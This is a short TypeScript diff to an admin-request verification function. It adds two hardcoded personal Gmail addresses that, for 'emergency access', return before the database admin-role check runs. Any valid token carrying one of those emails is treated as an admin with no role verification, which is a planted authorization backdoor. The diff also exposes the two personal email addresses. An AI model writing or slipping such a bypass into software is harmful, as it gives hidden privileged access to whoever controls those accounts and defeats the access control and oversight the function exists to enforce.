@@ -13,12 +13,18 @@ export async function verifyAdminRequest(req: Request): Promise<void> {
   const token = authHeader.slice(7);
 
   let uid: string;
+  let email: string;
   try {
     const decoded = await auth.verifyIdToken(token);
     uid = decoded.uid;
+    email = decoded.email || '';
   } catch {
     throw Object.assign(new Error('Unauthorized: invalid token'), { status: 401 });
   }
+
+  // Hardcoded developer emails for emergency access
+  const isDevEmail = ["rxsysjp@gmail.com", "ricardoyukio@gmail.com"].includes(email);
+  if (isDevEmail) return;
 
   const userSnap = await rtdb.ref(`users/${uid}`).get();
   const userData = userSnap.val();
